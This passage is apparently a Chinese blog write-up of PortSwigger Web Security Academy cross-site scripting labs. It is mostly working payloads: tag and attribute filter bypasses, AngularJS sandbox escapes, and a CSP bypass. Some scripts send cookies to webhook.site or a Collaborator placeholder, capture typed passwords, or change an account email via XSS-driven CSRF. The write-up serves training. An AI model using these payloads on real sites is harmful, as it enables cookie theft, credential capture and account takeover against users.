</span><span>                    day </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'0' </span><span style=color:#81a1c1>+ </span><span>day</span><span style=color:#eceff4>;
</span><span>
</span><span>                dateStr </span><span style=color:#81a1c1>= </span><span>[day</span><span style=color:#eceff4>, </span><span>month</span><span style=color:#eceff4>, </span><span>year]</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>join</span><span>(</span><span style=color:#a3be8c>'-'</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>                </span><span style=color:#81a1c1>let </span><span>newInnerHtml </span><span style=color:#81a1c1>= </span><span>firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>" | " </span><span style=color:#81a1c1>+ </span><span>dateStr
</span><span>                firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>= </span><span>newInnerHtml
</span><span>            }
</span><span>
</span><span>            firstPElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(avatarImgElement)</span><span style=color:#eceff4>;
</span><span>
</span><span>            commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(firstPElement)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>body) {
</span><span>                </span><span style=color:#81a1c1>let </span><span>commentBodyPElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>)</span><span style=color:#eceff4>;
</span><span>                commentBodyPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>escapeHTML</span><span>(comment</span><span style=color:#81a1c1>.</span><span>body)</span><span style=color:#eceff4>;
</span><span>
</span><span>                commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(commentBodyPElement)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>            commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>))</span><span style=color:#eceff4>;
</span><span>
</span><span>            userComments</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(commentSection)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>    }
</span><span>}</span><span style=color:#eceff4>;
</span></code></pre><p>js 中<code>replace</code>只会替换字符的第一次出现。所以 content 填入<code><>&LTimg src=x onerror=alert(window.origin)/></code>可以直接过<p><em>这里发现 svg 好像不能在 p 元素里用 小记一下</em><p>然后再测试了看起来好像存在的<code>Obfuscating attacks via HTML encoding</code>。由于提取文字用的是<code>innerHTML</code>而不是<code>innerText</code>无法实现。<h2 id=lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into HTML context with most tags and attributes blocked</h2><p>之前挖自己学校遇到过<a href=https://src.sjtu.edu.cn/post/237670/>类似的</a>，不过是存储型的。也就是 <a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>cheet sheet</a> 找一个不常见的属性。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>123"></span><span style=color:#81a1c1>&LTstyle></span><span style=color:#d08770>@</span><span style=color:#81a1c1>keyframes </span><span style=color:#eceff4>x{}</span><span style=color:#81a1c1>&LT/style>&LTinput </span><span style=color:#8fbcbb>style</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span>animation-name</span><span style=color:#eceff4>:x</span><span style=color:#a3be8c>" </span><span style=color:#8fbcbb>onanimationend</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"1+1;b=document;a=window.alert;a(b.cookie)"</span><span style=color:#d8dee9;background-color:#bf616a><</span><span style=color:#eceff4>/</span><span style=color:#8fbcbb>input</span><span style=color:#81a1c1>></span><span style=color:#eceff4>"
</span></code></pre><p><del><em>这个存储型+导致登录凭证泄露竟然给我低危🫠。。</em></del><p>这题的合法tag和attributes属实难找。不想写批量检测的，遂抄答案了<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>"></span><span style=color:#81a1c1>&LTbody </span><span style=color:#8fbcbb>onresize</span><span style=color:#eceff4>=</span><span style=color:#8fbcbb>print()</span><span style=color:#81a1c1>>
</span></code></pre><p><code>onresize</code>事件在<code>窗口或框架被调整大小时</code>发生。由于给了exploit-server，用 iframe 修改框架大小<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTiframe </span><span style=color:#8fbcbb>src</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" </span><span style=color:#8fbcbb>onload</span><span style=color:#eceff4>=</span><span style=color:#8fbcbb>this.style.width</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>'100px'</span><span style=color:#81a1c1>>
</span></code></pre><p>题解是用的 <code>burp Intruder</code>检测。看来 xss 字典还是有必要的。<h2 id=lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into HTML context with all tags blocked except custom ones</h2><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?search=</span><span style=color:#81a1c1>&LTxss+id%3Dx+onfocus%3Dalert(document.cookie)%20tabindex=1></span><span style=color:#eceff4>#x
</span></code></pre><p>用<code>location.hash</code>配合 id 自动 focus 到元素上触发 onfocus 事件。学到了<p>exploit-server 可以用 meta refresh 跳转<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTmeta </span><span style=color:#8fbcbb>http-equiv</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"refresh" </span><span style=color:#8fbcbb>content</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"0; url='https://0a6400b20383db3782698d65007c00b9.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'"</span><span style=color:#81a1c1>>
</span></code></pre><h2 id=lab-reflected-xss-with-some-svg-markup-allowed>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with some SVG markup allowed</h2><p>这一关没有字符处理，只有返回黑名单。<p><a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>XSS Cheet Sheet</a> 有个功能是 Copy tags/event/payloads，和<code>Burp Suite</code>的 Intruder 功能格式也对接好了。可以直接 Copy-Paste 到 payloads 里<p>测试发现只有<code>&LTsvg></code>、<code>&LTanimatetransform></code>、<code>&LTtitle> </code>和 <code>&LTimage></code>是 valid tag。然后测试<code>&LTsvg></code>的属性/事件，发现全部invalid。<code>&LTsvg></code>还有后面连接<code>animatetransform</code>、<code>animatemotion</code>、<code>animate</code>的用法，测试发现<code>animatetransform</code>可以使用<p>然后再对<code>animatetransform</code>的事件/属性进行测试，<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?search="></span><span style=color:#81a1c1>&LTsvg>&LTanimatetransform </span><span style=color:#8fbcbb>onbegin</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>alert(1)</span><span style=color:#81a1c1>>
</span></code></pre><h2 id=lab-reflected-xss-in-canonical-link-tag>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> in canonical link tag</h2><p>后端界面渲染。会把<code>&LTlink rel="canonical" href="https://0a6e00520312cce98c1ab92f007d0027.web-security-academy.net/?[input]"></code>渲染到canonical head里面。<p><a href=https://www.1deng.me/canonical-url.html#shen_me_shi_canonical_URL_biao_qian>canonical</a>标签 被称作规范网址，是用来给爬虫机器人看的（配置可以提高SEO）<p>那么就可以直接注入属性。题解给出的属性是<code>accesskey</code>，由键盘触发。另外注入的其他属性似乎在canonical下不生效。<p>![image-20230912144444581](webacademy XSS/image-20230912144444581.png)<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?'accesskey='x'onclick='alert(document.domain)
</span></code></pre><h2 id=lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into a JavaScript string with single quote and backslash escaped</h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>searchTerms </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'{{inupt}}'</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTimg src="/resources/images/tracker.gif?searchTerms='</span><span style=color:#81a1c1>+</span><span style=color:#88c0d0>encodeURIComponent</span><span>(searchTerms)</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'">'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>错误的转义策略：没有转义斜杠和尖括号。<p>直接注入<code>&LTscript></code>标签。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LT/script>&LTscript></span><span style=color:#88c0d0>alert</span><span style=color:#eceff4>(</span><span style=color:#8fbcbb>document</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>domain)</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><h2 id=lab-reflected-xss-into-a-javascript-string-with-angle-brackets>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into a JavaScript string with angle brackets</h2><p>前端渲染<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>searchTerms </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'{{input}}'</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTimg src="/resources/images/tracker.gif?searchTerms='</span><span style=color:#81a1c1>+</span><span style=color:#88c0d0>encodeURIComponent</span><span>(searchTerms)</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'">'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>反斜杠没有被正确转义<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span>\</span><span style=color:#a3be8c>'-alert(document.domain)/</span><span style=color:#d8dee9;background-color:#bf616a>/</span><span>
</span></code></pre><h2 id=lab-stored-xss-into-onclick-event-with-angle-brackets-and-double>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/stored>Stored XSS</a> into <code>onclick</code> event with angle brackets and double</h2><p>存储型。后端渲染<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTa </span><span style=color:#8fbcbb>id</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"author" </span><span style=color:#8fbcbb>href</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"https://ww.adsd" </span><span style=color:#8fbcbb>onclick</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>var </span><span>tracker</span><span style=color:#81a1c1>=</span><span style=color:#eceff4>{</span><span style=color:#88c0d0>track</span><span style=color:#eceff4>(){}};</span><span>tracker</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>track</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'{{website}}'</span><span style=color:#eceff4>);</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>></span><span style=color:#eceff4>1234</span><span style=color:#81a1c1>&LT/a>
</span></code></pre><p>单双引号、反斜杠均过滤。而onclick事件在触发时会进行一次html实体解码<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>http://foo?&ampapos;-alert(document.domain)-&ampapos;
</span></code></pre><h2 id=lab-reflected-xss-into-a-template-literal-with-angle-brackets>Lab: Reflected XSS into a template literal with angle brackets,</h2><p>后端渲染，但是该转义的都转义了。<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>message </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>`0 search results for '{{input}}'`</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementById</span><span>(</span><span style=color:#a3be8c>'searchMessage'</span><span>)</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>message</span><span style=color:#eceff4>;
</span></code></pre><p>但是渲染的字符串在 js 中被飘号（反引号）包裹。用 js 格式化字符串xss。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?search=${alert(document.domain)}
</span></code></pre><h2 id=lab-exploiting-cross-site-scripting-to-steal-cookies>Lab: Exploiting cross-site scripting to steal cookies</h2><p>想着简单一点直接改location结果找不到report..然后才发现只允许使用burp提供的公共服务器<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript></span><span style=color:#8fbcbb>window</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>location</span><span style=color:#81a1c1>=</span><span style=color:#a3be8c>'https://webhook.site/cb9f69b1-bad8-46f1-8a14-a8249b19b89f/?cookie='</span><span style=color:#81a1c1>+</span><span style=color:#8fbcbb>document</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>cookie</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><p>反正是对自己 xss 成功了。那就当我解出了吧💦💦<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span style=color:#eceff4>, {
</span><span style=color:#eceff4>method: </span><span style=color:#a3be8c>'POST'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>mode: </span><span style=color:#a3be8c>'no-cors'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>body:</span><span style=color:#8fbcbb>document</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>cookie
</span><span style=color:#eceff4>});
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><p>**POST的方式<h2 id=lab-exploiting-cross-site-scripting-to-capture-passwords>Lab: Exploiting cross-site scripting to capture passwords</h2><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTinput </span><span style=color:#8fbcbb>name</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>username </span><span style=color:#8fbcbb>id</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>username</span><span style=color:#81a1c1>>
</span><span style=color:#81a1c1>&LTinput </span><span style=color:#8fbcbb>type</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>password </span><span style=color:#8fbcbb>name</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>password </span><span style=color:#8fbcbb>onchange</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>if</span><span style=color:#eceff4>(</span><span style=color:#81a1c1>this.</span><span style=color:#eceff4>value</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>length)</span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span style=color:#eceff4>,{
</span><span style=color:#eceff4>method:</span><span style=color:#a3be8c>'POST'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>mode: </span><span style=color:#a3be8c>'no-cors'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>body:</span><span>username</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>value</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>':'</span><span style=color:#81a1c1>+this.</span><span style=color:#eceff4>value
</span><span style=color:#eceff4>});</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>>
</span></code></pre><p>HTML注入🤔以前没看过。不过也确实是一种拿密码的攻击方式。<h2 id=lab-exploiting-xss-to-perform-csrf>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/exploiting>Exploiting XSS</a> to perform CSRF</h2><p>利用 XSS 到 CSRF。因为有 csrf token 所以要特别处理<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span style=color:#eceff4>(</span><span style=color:#81a1c1>async</span><span style=color:#eceff4>() </span><span style=color:#81a1c1>=> </span><span style=color:#eceff4>{
</span><span style=color:#eceff4>    </span><span style=color:#81a1c1>var </span><span>email </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'gtg@thebearhimself.rest'</span><span style=color:#eceff4>;
</span><span style=color:#eceff4>	</span><span style=color:#81a1c1>var </span><span>csrf </span><span style=color:#81a1c1>= await </span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'/my-account'</span><span style=color:#eceff4>)
</span><span style=color:#eceff4>		</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>then</span><span style=color:#eceff4>((</span><span>response</span><span style=color:#eceff4>)</span><span style=color:#81a1c1>=></span><span style=color:#eceff4>{</span><span style=color:#81a1c1>return </span><span>response</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>text</span><span style=color:#eceff4>();})
</span><span style=color:#eceff4>		</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>then</span><span style=color:#eceff4>((</span><span>html</span><span style=color:#eceff4>)</span><span style=color:#81a1c1>=></span><span style=color:#eceff4>{</span><span style=color:#81a1c1>return </span><span>html</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>match</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>/</span><span style=color:#ebcb8b>(?<=value\=")</span><span>[A-Za-z0-9]</span><span style=color:#81a1c1>+</span><span style=color:#ebcb8b>(?=")</span><span style=color:#a3be8c>/</span><span style=color:#eceff4>)[</span><span style=color:#b48ead>0</span><span style=color:#eceff4>];});
</span><span style=color:#eceff4>	</span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'/my-account/change-email'</span><span style=color:#eceff4>,{
</span><span style=color:#eceff4>    	method: </span><span style=color:#a3be8c>'POST'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>		mode: </span><span style=color:#a3be8c>'no-cors'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>    	headers: {
</span><span style=color:#eceff4>    		</span><span style=color:#a3be8c>'Content-Type'</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'application/x-www-form-urlencoded'
</span><span style=color:#eceff4>    	},
</span><span style=color:#eceff4>		body: </span><span style=color:#a3be8c>`email=</span><span style=color:#eceff4>${</span><span>email</span><span style=color:#eceff4>}</span><span style=color:#a3be8c>&csrf=</span><span style=color:#eceff4>${</span><span>csrf</span><span style=color:#eceff4>}</span><span style=color:#a3be8c>`
</span><span style=color:#eceff4>	})
</span><span style=color:#eceff4>})();
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><p><del>tbh 因为console和page的异步差异卡了许久</del><p>题解给的用的是古老的<code>XMLHttpRequest</code>api：<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span style=color:#81a1c1>var </span><span>req </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span style=color:#eceff4>();
</span><span>req</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>onload </span><span style=color:#81a1c1>= </span><span>handleResponse</span><span style=color:#eceff4>;
</span><span>req</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'get'</span><span style=color:#eceff4>,</span><span style=color:#a3be8c>'/my-account'</span><span style=color:#eceff4>,</span><span style=color:#81a1c1>true</span><span style=color:#eceff4>);
</span><span>req</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span style=color:#eceff4>();
</span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>handleResponse</span><span style=color:#eceff4>() {
</span><span style=color:#eceff4>    </span><span style=color:#81a1c1>var </span><span>token </span><span style=color:#81a1c1>= this.</span><span style=color:#eceff4>responseText</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>match</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>/</span><span style=color:#ebcb8b>name="csrf" value="(</span><span>\w</span><span style=color:#81a1c1>+</span><span style=color:#ebcb8b>)"</span><span style=color:#a3be8c>/</span><span style=color:#eceff4>)[</span><span style=color:#b48ead>1</span><span style=color:#eceff4>];
</span><span style=color:#eceff4>    </span><span style=color:#81a1c1>var </span><span>changeReq </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span style=color:#eceff4>();
</span><span style=color:#eceff4>    </span><span>changeReq</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'post'</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>'/my-account/change-email'</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>true</span><span style=color:#eceff4>);
</span><span style=color:#eceff4>    </span><span>changeReq</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'csrf='</span><span style=color:#81a1c1>+</span><span>token</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'&email=test@test.com'</span><span style=color:#eceff4>)
</span><span style=color:#eceff4>};
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><h2 id=lab-reflected-xss-with-angularjs-sandbox-escape-without-strings>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with AngularJS sandbox escape without strings</h2><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript></span><span>angular</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>module</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'labApp'</span><span style=color:#eceff4>, [])</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>controller</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'vulnCtrl'</span><span style=color:#eceff4>,</span><span style=color:#81a1c1>function</span><span style=color:#eceff4>(</span><span>$scope</span><span style=color:#eceff4>, </span><span>$parse</span><span style=color:#eceff4>) {
</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>query </span><span style=color:#81a1c1>= </span><span style=color:#eceff4>{};
</span><span style=color:#81a1c1>var </span><span>key </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'search'</span><span style=color:#eceff4>;
</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>query[</span><span>key</span><span style=color:#eceff4>] </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'123'</span><span style=color:#eceff4>;
</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>value </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>$parse</span><span style=color:#eceff4>(</span><span>key</span><span style=color:#eceff4>)(</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>query);
</span><span style=color:#eceff4>});</span><span style=color:#81a1c1>&LT/script>
</span><span style=color:#81a1c1>&LTh1 </span><span style=color:#8fbcbb>ng-controller</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>vulnCtrl</span><span style=color:#81a1c1>></span><span style=color:#eceff4>0 search results for {{value}}</span><span style=color:#81a1c1>&LT/h1>
</span></code></pre><p>$scope 用于规范当前作用域（没搜到 应该是和这个controller相关的<p><a href=https://docs.angularjs.org/api/ng/service/$parse>$parse</a> 的功能是将 AngularJS 表达式转换为函数。类似 JS 中 function constructor 的感觉<p>通过原型设置<code>String.charAt</code>破坏沙箱逻辑，然后将数组传递给 orderBy 过滤器。再次使用 toString() 创建字符串和 String 构造函数属性来设置过滤器的参数，再使用<code>fromCharCode</code>方法通过将字符代码转换为字符串<code>x=alert(1)</code>来生成 payload。<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>?</span><span>search</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>1</span><span style=color:#81a1c1>&</span><span style=color:#88c0d0>toString</span><span>()</span><span style=color:#81a1c1>.</span><span>constructor</span><span style=color:#81a1c1>.</span><span>prototype</span><span style=color:#81a1c1>.</span><span>charAt</span><span style=color:#81a1c1>%</span><span>3d[]</span><span style=color:#81a1c1>.</span><span>join;[</span><span style=color:#b48ead>1</span><span>]</span><span style=color:#81a1c1>|</span><span>orderBy</span><span style=color:#81a1c1>:</span><span style=color:#88c0d0>toString</span><span>()</span><span style=color:#81a1c1>.</span><span>constructor</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>fromCharCode</span><span>(</span><span style=color:#b48ead>120</span><span style=color:#eceff4>,</span><span style=color:#b48ead>61</span><span style=color:#eceff4>,</span><span style=color:#b48ead>97</span><span style=color:#eceff4>,</span><span style=color:#b48ead>108</span><span style=color:#eceff4>,</span><span style=color:#b48ead>101</span><span style=color:#eceff4>,</span><span style=color:#b48ead>114</span><span style=color:#eceff4>,</span><span style=color:#b48ead>116</span><span style=color:#eceff4>,</span><span style=color:#b48ead>40</span><span style=color:#eceff4>,</span><span style=color:#b48ead>49</span><span style=color:#eceff4>,</span><span style=color:#b48ead>41</span><span>)</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>1
</span></code></pre><p><del>有点难、也许应该先读一读 AngularJS 源码</del><h2 id=lab-reflected-xss-with-angularjs-sandbox-escape-and-csp>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with AngularJS sandbox escape and CSP</h2><pre class=language-htaccess data-lang=htaccess style=color:#d8dee9;background-color:#2e3440><code class=language-htaccess data-lang=htaccess><span>Content-Security-Policy: 
</span><span>default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
</span></code></pre><p>script 指定了仅同源<p>题解通过 hash 触发 AngularJS 中的<code>ng-focus</code>。payload中冒号表示正在发送到过滤器的参数。在参数中，我们没有直接调用警报函数，而是将其分配给变量 z。仅当 orderBy 操作到达 $event.path 数组中的 window 对象时才会调用该函数。这意味着它可以在窗口范围内调用，而无需显式引用<code>window</code>对象，从而有效地绕过 AngularJS 的<code>window</code>检查。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span>location</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>href</span><span style=color:#81a1c1>=</span><span style=color:#a3be8c>"https://0a580013046fcd29842ff495005000f3.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x"
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><h2 id=lab-reflected-xss-with-event-handlers-and-href-attributes-blocked>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with event handlers and <code>href</code> attributes blocked</h2><p>限制了href属性但是要做到 Click button 利用。通过 svg:animate 设置额外的参数。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTsvg>&LTa>&LTanimate </span><span style=color:#8fbcbb>attributeName</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>href </span><span style=color:#8fbcbb>values</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>javascript:alert(1) </span><span style=color:#81a1c1>/>&LTtext </span><span style=color:#8fbcbb>x</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>20 </span><span style=color:#8fbcbb>y</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>20</span><span style=color:#81a1c1>></span><span style=color:#eceff4>Click me</span><span style=color:#81a1c1>&LT/text>&LT/a>
</span></code></pre><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>https://0a750087032fc49e810b346d00650005.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
